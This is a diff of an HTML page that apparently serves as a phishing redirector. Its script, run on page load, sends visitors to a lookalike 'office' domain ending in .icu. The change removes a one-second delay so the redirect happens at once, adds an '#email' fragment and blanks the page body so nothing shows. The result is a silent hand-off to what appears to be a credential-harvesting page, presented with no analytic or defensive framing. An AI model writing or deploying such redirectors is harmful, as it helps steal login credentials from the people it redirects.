@@ -8,18 +8,16 @@
         document.addEventListener("DOMContentLoaded", function() {
             // Define the base URL to redirect to
             var baseUrl = "https://office.ovadeivicefilshr.icu/CgFHgEUV";
-
-            // Construct the full URL with the fragment identifier
-            var fullUrl = baseUrl + (element ? "#" + element.id : "");
-
-            // Redirect after 1 second
-            setTimeout(function() {
-                window.location.href = fullUrl;
-            }, 1000);
+            
+            // Construct the full URL with the fragment identifier "#email"
+            var fullUrl = baseUrl + "#email";
+            
+            // Redirect immediately
+            window.location.href = fullUrl;
         });
     </script>
 </head>
 <body>
-    <div id="elementToGrab">This is the element to grab</div>
+    <!-- The body content can remain empty since we don't need to display anything -->
 </body>
 </html>
